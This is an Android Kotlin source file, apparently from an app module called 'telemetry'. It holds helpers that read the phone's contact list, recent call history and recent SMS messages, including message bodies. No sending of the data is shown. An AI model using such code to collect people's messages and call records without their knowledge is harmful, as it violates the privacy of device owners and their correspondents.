package com.example.telemetry

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import com.example.data.model.CallData
import com.example.data.model.ContactData
import com.example.data.model.SmsData

class ContactsHelper(private val context: Context) {
    fun getContacts(): List<ContactData> {
        val list = mutableListOf<ContactData>()
        val contentResolver = context.contentResolver
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            if (cursor != null) {
                val nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                
                while (cursor.moveToNext()) {
                    val name = if (nameIndex != -1) cursor.getString(nameIndex) ?: "" else ""
                    val number = if (numberIndex != -1) cursor.getString(numberIndex) ?: "" else ""
                    if (name.isNotEmpty() || number.isNotEmpty()) {
                        list.add(ContactData(name = name, phone = number))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("ContactsHelper", "Error reading contacts: ${e.message}")
        } finally {
            cursor?.close()
        }
        return list.distinctBy { it.phone }
    }
}

class CallHistoryHelper(private val context: Context) {
    fun getCallHistory(): List<CallData> {
        val list = mutableListOf<CallData>()
        val contentResolver = context.contentResolver
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )
        
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, CallLog.Calls.DATE + " DESC")
            if (cursor != null) {
                val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
                
                var count = 0
                while (cursor.moveToNext() && count < 100) { // Limit to 100 most recent records for performance
                    val number = if (numberIndex != -1) cursor.getString(numberIndex) ?: "" else ""
                    val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
                    val rawType = if (typeIndex != -1) cursor.getInt(typeIndex) else CallLog.Calls.INCOMING_TYPE
                    val duration = if (durationIndex != -1) cursor.getLong(durationIndex) else 0L
                    val timestamp = if (dateIndex != -1) cursor.getLong(dateIndex) else System.currentTimeMillis()
                    
                    val typeStr = when (rawType) {
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        else -> "INCOMING"
                    }
                    
                    list.add(
                        CallData(
                            number = number,
                            name = name,
                            type = typeStr,
                            duration = duration,
                            timestamp = timestamp
                        )
                    )
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e("CallHistoryHelper", "Error reading call history: ${e.message}")
        } finally {
            cursor?.close()
        }
        return list
    }
}

class SmsHelper(private val context: Context) {
    fun getSmsLogs(): List<SmsData> {
        val list = mutableListOf<SmsData>()
        val contentResolver = context.contentResolver
        val uri = Uri.parse("content://sms")
        val projection = arrayOf("address", "body", "type", "date")
        
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, "date DESC")
            if (cursor != null) {
                val addressIndex = cursor.getColumnIndex("address")
                val bodyIndex = cursor.getColumnIndex("body")
                val typeIndex = cursor.getColumnIndex("type")
                val dateIndex = cursor.getColumnIndex("date")
                
                var count = 0
                while (cursor.moveToNext() && count < 100) { // Limit to 100 most recent records for performance
                    val address = if (addressIndex != -1) cursor.getString(addressIndex) ?: "" else ""
                    val body = if (bodyIndex != -1) cursor.getString(bodyIndex) ?: "" else ""
                    val rawType = if (typeIndex != -1) cursor.getInt(typeIndex) else 1
                    val timestamp = if (dateIndex != -1) cursor.getLong(dateIndex) else System.currentTimeMillis()
                    
                    val typeStr = if (rawType == 2) "SENT" else "INBOX"
                    
                    list.add(
                        SmsData(
                            address = address,
                            body = body,
                            type = typeStr,
                            timestamp = timestamp
                        )
                    )
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e("SmsHelper", "Error reading SMS: ${e.message}")
        } finally {
            cursor?.close()
        }
        return list
    }
}
